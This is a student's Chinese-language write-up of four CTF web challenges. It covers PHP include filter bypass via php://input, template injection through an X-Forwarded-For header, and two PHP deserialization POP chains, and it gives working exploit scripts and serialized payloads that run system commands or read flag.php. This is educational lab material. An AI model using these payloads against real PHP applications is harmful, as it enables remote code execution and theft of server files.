#  寒假WEEK2

### 1.QHCTF忘记标题1

```php
<?php
error_reporting(0);
//flag in flag.php
$file=$_GET['file'];
if(isset($file))
{
    if(!preg_match("/flag/i",$file))
    {
        include($file);
    }
    else
    {
        echo("no no no ~ ");
    }
}
else
{
    highlight_file(__FILE__);
}

?>
```

审计代码，发现flag被正则匹配了，且存在include函数，所以想到了用php伪协议来读文件

Bp抓包一下，修改响应头，利用php://input来实行命令，payload如下图所示：

![a5dc37bf934b9a272a0c2f0a5dcc8e2a](C:\Users\lenovo\AppData\Roaming\Typora\24-aye-hoyosei\image\a5dc37bf934b9a272a0c2f0a5dcc8e2a.png)

send以后响应头即可找到flag

## 2.QHCTF忘记标题2

打开一看是uu原题，查一下笔记，bp抓一把就打了

![屏幕截图 2025-01-25 095941](C:\Users\lenovo\AppData\Roaming\Typora\24-aye-hoyosei\image\屏幕截图 2025-01-25 095941.png)

![屏幕截图 2025-01-25 100023](C:\Users\lenovo\AppData\Roaming\Typora\24-aye-hoyosei\image\屏幕截图 2025-01-25 100023.png)

这里补充一下思路：

题目提到了ip，且flag界面会显示你的ip，所以自然想到了xff头，bp抓包一下，添加一个X-Forwarded-For：127.0.0.1，查看回显，发现我们的ip变成了127.0.0.1。再把xff改成1，发现ip也变成了。所以由此可以判断，xff是受我们控制的。因为存在模板注入漏洞，所以写入命令，{{syste('ls /')}}，{{system('cat /flag')}}

### 3.反方向的钟

```php
<?php

error_reporting(0);

highlight_file(__FILE__);

// flag.php

class teacher{

  public $name;

  public $rank;

  private $salary;

  public function __construct($name,$rank,$salary = 10000){

​    $this->name = $name;

​    $this->rank = $rank;

​    $this->salary = $salary;

  }

}

class classroom{

  public $name;

  public $leader;

  public function __construct($name,$leader){

​    $this->name = $name;

​    $this->leader = $leader;

  }

  public function hahaha(){

​    if($this->name != 'one class' or $this->leader->name != 'ing' or $this->leader->rank !='department'){

​      return False;

​    }

​    else{

​      return True;

​    }

  }

}

class school{

  public $department;

  public $headmaster;

  public function __construct($department,$ceo){

​    $this->department = $department;

​    $this->headmaster = $ceo;

  }

  public function IPO(){

​    if($this->headmaster == 'ong'){

​      echo "Pretty Good ! Ctfer!\n";

​      echo new $_POST['a']($_POST['b']);

​    }

  }

  public function __wakeup(){

​    if($this->department->hahaha()) {

​      $this->IPO();

​    }

  }

}

if(isset($_GET['d'])){

  unserialize(base64_decode($_GET['d']));

}

?>
```

审计代码，发现可以利用school中的IPO方法来读取flag，写出链子：IPO()<-wakeup()<-hahaha()

需满足的条件有：

1）$this->department->hahaha()为真

2）$this->name != 'one class' or $this->leader->name != 'ing' or $this->leader->rank !='department'为假

3）$this->headmaster == 'ong'为真

```php
exp：

<?php

class teacher{

  public $name='ing';

  public $rank='department';

}

class classroom{

  public $name='one class';

  public $leader;

}

class school{

  public $department;

  public $headmaster='ong';

}

$a=new school();

$a->department=new classroom();

$a->department->leader=new teacher();

echo base64_encode(serialize($a));

?>

 
```

最终payload：

？d=Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30=

a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag.php

 Base64解码后得到flag 

参考文章：

[SplFileObject简单使用.md - redfish999 - 博客园 (cnblogs.com)](https://www.cnblogs.com/redfish404/articles/18106289)

[文章 - 浅析php原生类 - 先知社区](https://xz.aliyun.com/news/10609)

[PHP原生类详解-CSDN博客](https://blog.csdn.net/qq_71467825/article/details/131332439)

补充一些自己对原生类的理解：

原生类就是PHP内置的类，便于使用各种库，本题使用的SplFileObject类是SPL库中的标准文件操作类，如其名字字面意思，可以用于读文件,可以读取文件的信息，但SplFileObject只能读取文件第一行，所以需要使用php://filter才能来读取完整的文件内容。

### 4.ez_1zpop

```php
<?php

error_reporting(0);

class dxg

{

  function fmm()

  {

   return "nonono";

  }

}

class lt

{

  public $impo='hi';

  public $md51='weclome';

  public $md52='to NSS';

  function __construct()

  {

   $this->impo = new dxg;

  }

  function __wakeup()

  {

   $this->impo = new dxg;

   return $this->impo->fmm();

  }

  function __toString()

  {

   if (isset($this->impo) && md5($this->md51) == md5($this->md52) && $this->md51 != $this->md52)

​     return $this->impo->fmm();

  }

  function __destruct()

  {

   echo $this;

  }

}

class fin

{

  public $a;

  public $url = 'https://www.ctfer.vip';

  public $title;

  function fmm()

  {

   **$b = $this->a;**

   **$b($this->title);**

  }

}

if (isset($_GET['NSS'])) {

  $Data = unserialize($_GET['NSS']);

} else {

  highlight_file(__file__);

}
```

 pop链fmn)<-lt(to_string)<-lt(destruct)，这里需要绕过wakeup 

```
exp：

<?php

class lt

{

  public $impo='hi';

  public $md51='s878926199a';

  public $md52='s155964671a';

}

class fin

{

  public $a='system';

  public $url = 'https://www.ctfer.vip';

  public $title='ls /';  

}

$a=new lt();

$a->impo=new fin();

echo serialize($a);
```

 payload：

？NSS=O:2:"lt":**4**:{s:4:"impo";O:3:"fin":3:{s:1:"a";s:6:"system";s:3:"url";s:21:"https://www.ctfer.vip";s:5:"title";s:4:"ls /";}s:4:"md51";s:11:"s878926199a";s:4:"md52";s:11:"s155964671a";}

?NSS=O:2:"lt":**4**:{s:4:"impo";O:3:"fin":3:{s:1:"a";s:6:"system";s:3:"url";s:21:"https://www.ctfer.vip";s:5:"title";s:9:"cat /flag";}s:4:"md51";s:11:"s878926199a";s:4:"md52";s:11:"s155964671a";}

 